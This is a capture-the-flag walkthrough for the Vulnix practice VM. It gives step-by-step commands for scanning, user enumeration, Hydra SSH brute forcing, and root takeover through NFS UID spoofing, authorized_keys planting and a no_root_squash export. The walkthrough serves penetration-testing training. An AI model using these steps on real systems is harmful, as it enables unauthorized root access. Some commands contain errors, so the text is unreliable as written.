@@ -1,0 +1,108 @@
+Description:
+
+Here we have a vulnerable Linux host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!)
+The host is based upon Ubuntu Server 12.04 and is fully patched as of early September 2012. The details are as follows:
+
+Architecture: x86
+Format: VMware (vmx & vmdk) compatibility with version 4 onwards
+RAM: 512MB
+Network: NAT
+Extracted size: 820MB
+
+THE GOAL:
+boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish.
+
+
+Scan the whole network using Nmap
+To Identify Vulnix Box IP. { sudo nmap -A <ip address/24>}
+Enumeration
+Enumeration is an important part of pentesting, debatable to be the most important step. In this step we’ll be enumeration services running on victim as well as users.
+
+1.1 Services Enumeration
+You don’t usually need to scan all ports, top 1000 are usually good for starting, but in this example all ports will be scanned for TCP services.
+
+Great, we got many services running, notables are:
+
+>Port 22: SSH
+>Port 25: SMTP
+>Port 79: Finger
+>Port 110: POP3
+>Port 111: RPCbind
+>Port 143: IMAP
+>Port 512: RSH (Remote shell)
+>Port 513: RLogin
+>Port 514: shell?
+
+1.2 Port 22 — Inspecting SSH — OpenSSH 5.9p1
+
+Now we check for exploit on the searchxploite and found nothing useful there so moving on.
+
+Enumerating users using metasploit
+search auxiliary/scanner/smtp/smtp_enum
+set rhost <ip address>
+run/exploit
+
+Enumeration continuation using metasploit
+search auxiliary/scanner/finger/finger_users
+set rhost <ip address>
+run/exploit
+
+Brute forcing SSH 
+Running Hydra against either user or vulnix is an option with rockyou wordlist, although this will take a very long time
+hydra -l user -P rockyou.txt <ip address> ssh -t 4
+
+Privilege escalation
+Let's try to get the UID for vulnix and create a temporary user on our system and access it.
+- sudo showmount -e <ip address>
+- sudo mkdir /mnt/vulnix
+- sudo mount <ip address>:/home/vulnix /mnt/vulnix -o vers=3
+
+Add New User
+- sudo adduser -u 2008 vulnix {create password vulnix}
+
+Switch User to vulnix
+- su vulnix
+
+Now Create .ssh folder in /mnt/vulnix
+- mkdir /mnt/vulnix/.ssh
+
+So, let’s generate an ssh key by using builtin command ssh-keygen.
+- ssh-keygen -t rsa
+
+Navigate to .ssh folder in ~ directory where the generated keygen is located
+
+Now copy id_rsa.pub as authorized_keys
+- cp id_rsa.pub /mnt/vulnix/authorized_keys
+
+Simply use ssh to login...
+- ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa vulnix@<ip address>
+
+Once you are inside vulnix‒ run
+- sudo -ll
+- sudoedit /etc/exports- add  /root *(rw, no_root_squash)
+- roboot vulnix box
+
+on kali terminal
+- sudo showmount -e <ip address> ‒ root user has been added
+- sudo mkdir /mnt/vulnroot
+- sudo mount <ip address>:root /mnt/vulnroot -o vers=3
+
+Now generate keygen like we did on vulnix box
+create .ssh folder in /mnt/vulnroot directory
+- sudo mkdir mnt/vulnroot/.ssh
+
+copy the generated keygen id_rsa.pub to /mnt/vulnroot/.ssh as authorized_keys
+- sudo cp id_rsa.pub to /mnt/vulnroot/.ssh/authorized_keys
+
+Now login to vulnix box as root with ssh
+- ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa root@192.168.37.135
+
+Once you gained access as root
+ls
+congratulations!!! you can now cat out trophy.txt
+
+
+
+
+
+
